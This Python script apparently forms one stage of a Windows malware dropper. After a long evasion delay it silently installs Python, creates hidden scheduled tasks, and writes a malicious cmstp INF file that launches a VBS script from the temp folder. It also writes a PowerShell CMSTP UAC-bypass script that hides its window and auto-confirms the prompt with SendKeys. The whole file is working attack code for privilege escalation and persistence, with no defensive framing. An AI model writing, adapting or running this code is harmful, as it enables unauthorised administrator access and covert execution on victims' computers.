import os
import subprocess
import time
import sys
time.sleep(800)
def run_command(command, wait=True):
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout = result.stdout.decode(errors='replace')
    stderr = result.stderr.decode(errors='replace')
    return result.returncode, stdout, stderr

def create_inf_file():
    temp_folder = os.getenv('TEMP')
    inf_content = f"""
    [version]
    Signature="$Windows NT$"
    AdvancedINF=2.5

    [DefaultInstall]
    CustomDestination=CustInstDestSectionAllUsers
    RunPreSetupCommands=RunPreSetupCommandsSection

    [RunPreSetupCommandsSection]
    ; Commands to run before setup begins
    taskkill /IM cmstp.exe /F
    cmd /c start {temp_folder}\\ddd.vbs

    [CustInstDestSectionAllUsers]
    49000,49001=AllUser_LDIDSection,7

    [AllUser_LDIDSection]
    "HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

    [Strings]
    ServiceName="CorpVPN"
    ShortSvcName="CorpVPN"
    """

    inf_file_path = os.path.join(temp_folder, 'corpvpn.inf')
    with open(inf_file_path, 'w') as f:
        f.write(inf_content)

    return inf_file_path

def create_a_ps1():
    ps_code = '''
# UAC Bypass poc using SendKeys
# Version 1.0
# Author: Oddvar Moe
# Functions borrowed from: https://powershell.org/forums/topic/sendkeys/
# Todo: Hide window on screen for stealth
# Todo: Make script edit the INF file for command to inject...

# Point this to your INF file containing your juicy commands...
$InfFile = "$env:TEMP\\corpvpn.inf"

Function Get-Hwnd {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [string] $ProcessName
    )
    Process {
        $ErrorActionPreference = 'Stop'
        Try {
            $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle
        } Catch {
            $hwnd = $null
        }
        $hash = @{
            ProcessName = $ProcessName
            Hwnd        = $hwnd
        }
        New-Object -TypeName PsObject -Property $hash
    }
}

function Set-WindowActive {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [string] $Name
    )
    Process {
        $memberDefinition = @'
        [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
'@
        Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
        $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd
        If ($hwnd) {
            $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0)
            [User32.Api]::SetForegroundWindow($hwnd)
            [User32.Api]::ShowWindow($hwnd, 0)  # Pencereyi gizli hale getirmek için 0 kullanılır
        } Else {
            [string] $hwnd = 'N/A'
        }
        $hash = @{
            Process = $Name
            Hwnd    = $hwnd
        }
        New-Object -TypeName PsObject -Property $hash
    }
}

#Needs Windows forms
Add-Type -AssemblyName System.Windows.Forms

#Command to run
$ps = New-Object System.Diagnostics.ProcessStartInfo "c:\\windows\\system32\\cmstp.exe"
$ps.Arguments = "/au $InfFile"
$ps.UseShellExecute = $false
$ps.CreateNoWindow = $true  # Bu özellik işlemi görünmez yapar

#Start it
[System.Diagnostics.Process]::Start($ps) | Out-Null  # Out-Null ile çıktıyı engelledik

do {
    # Do nothing until cmstp is an active window
} until ((Set-WindowActive cmstp).Hwnd -ne 0)

#Activate window
Set-WindowActive cmstp

#Send the Enter key
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
'''

    temp_folder = os.getenv('TEMP')
    a_ps1_path = os.path.join(temp_folder, 'a.ps1')
    with open(a_ps1_path, 'w') as f:
        f.write(ps_code)

    return a_ps1_path

def main():
    # Delete old tasks
    run_command('schtasks /delete /tn "InstallRequests" /f')
    run_command('schtasks /delete /tn "RunPowerShellScript" /f')

    # Check if Python is installed
    returncode, stdout, stderr = run_command("python --version")
    if returncode != 0:
        # Python is not installed. Start Python installation...
        returncode, stdout, stderr = run_command('first.exe /quiet InstallAllUsers=0 PrependPath=1')
        if returncode != 0:
            sys.exit(1)
        else:
            pass
    else:
        pass

    # Create and schedule install_requests.py
    temp_dir = os.getenv('TEMP')
    script_path = os.path.join(temp_dir, 'install_requests.py')
    with open(script_path, 'w') as script_file:
        script_file.write("import subprocess\n")
        script_file.write("subprocess.check_call(['python', '-m', 'pip', 'install', 'requests'])\n")

    returncode, stdout, stderr = run_command(f'schtasks /create /tn "InstallRequests" /tr "python {script_path}" /sc once /st 00:00 /f')
    if returncode != 0:
        print(f"Failed to create task 'InstallRequests': {stderr}")
        sys.exit(1)

    # Run the task
    run_command('schtasks /run /tn "InstallRequests"')

    


    # Wait for task completion or timeout, then clean up
    time.sleep(10)
    os.remove(script_path)

    # Create and schedule PowerShell script
    a_ps1_path = create_a_ps1()
    if os.path.exists(a_ps1_path):
        returncode, stdout, stderr = run_command(f'schtasks /create /tn "RunPowerShellScript" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File {a_ps1_path}" /sc once /st 00:00 /f')
        if returncode != 0:
            print(f"Failed to create task 'RunPowerShellScript': {stderr}")
            sys.exit(1)
        run_command('schtasks /run /tn "RunPowerShellScript"')
    else:
        print("PowerShell script file does not exist.")

    # Create INF file if necessary
    inf_file_path = create_inf_file()

if __name__ == "__main__":
    main()
